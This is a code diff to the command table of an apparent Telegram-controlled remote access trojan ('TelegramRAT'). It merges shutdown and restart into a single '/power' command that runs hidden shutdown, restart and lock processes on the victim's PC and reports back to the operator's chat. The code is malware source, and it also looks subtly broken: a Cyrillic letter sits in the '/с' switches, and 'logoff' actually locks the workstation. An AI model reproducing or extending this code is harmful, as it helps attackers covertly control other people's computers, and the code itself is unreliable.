@@ -441,62 +441,60 @@ namespace TelegramRAT
                 Description = "Get current directory."
             });
 
-            //SHUTDOWN
+            //POWER MEGA COMMAND
             CommandsList.Add(new BotCommand
             {
                 Command = "/power",
                 CountArgs = 1,
-                Description = "Turn PC off.",
-                Example = "/power off",
+                Description = "Switch PC power state. Usage:\n\n" +
+                "off - Turn PC off\n" +
+                "restart - Restart PC\n" +
+                "logoff - Log off system",
+                Example = "/power logoff",
                 Execute = (model, update) =>
                 {
                     try
                     {
-                        if (model.Args[0] != "off")
+                        switch (model.Args[0])
                         {
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "To shutdown pc send /power off!", replyToMessageId: update.Message.MessageId);
-                            return;
+                            case "off":
+                                Process shutdown = new Process();
+                                shutdown.StartInfo.CreateNoWindow = true;
+                                shutdown.StartInfo.FileName = "powershell.exe";
+                                shutdown.StartInfo.Arguments = "/с shutdown /s /t 1";
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                                shutdown.Start();
+                                break;
+
+                            case "restart":
+                                Process restart = new Process();
+                                restart.StartInfo.CreateNoWindow = true;
+                                restart.StartInfo.FileName = "powershell.exe";
+                                restart.StartInfo.Arguments = "/с shutdown /r /t 1";
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!");
+                                restart.Start();
+                                break;
+
+                            case "logoff":
+                                Process logoff = new Process();
+                                logoff.StartInfo.CreateNoWindow = true;
+                                logoff.StartInfo.FileName = "cmd.exe";
+                                logoff.StartInfo.Arguments = "/c rundll32.exe user32.dll,LockWorkStation";
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!");
+                                logoff.Start();
+                                break;
+
+                            default:
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Wrong usage, type /help power to get info about this command!", replyToMessageId: update.Message.MessageId);
+                                break;
                         }
-                        Process shutdown = new Process();
-                        shutdown.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        shutdown.StartInfo.FileName = "powershell.exe";
-                        shutdown.StartInfo.Arguments = "/C shutdown /s /t 1";
-                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                        shutdown.Start();
+
                     }
                     catch (Exception ex)
                     {
                         ReportError(update, ex);
                     }
                 }
-            });
-
-            //RESTART
-            CommandsList.Add(new BotCommand
-            {
-                Command = "/restart",
-                CountArgs = 0,
-                MayHaveNoArgs = true,
-                Description = "Restart PC",
-                Example = "/restart",
-                Execute = async (model, update) =>
-                {
-                    try
-                    {
-                        Process restart = new Process();
-
-                        restart.StartInfo.CreateNoWindow = true;
-                        restart.StartInfo.FileName = "powershell.exe";
-                        restart.StartInfo.Arguments = "/C shutdown /r /t 1";
-                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!");
-                        restart.Start();
-                    }
-                    catch (Exception ex)
-                    {
-                        ReportError(update, ex);
-                    }
-                }
-
             });
 
             //DOWNLOAD
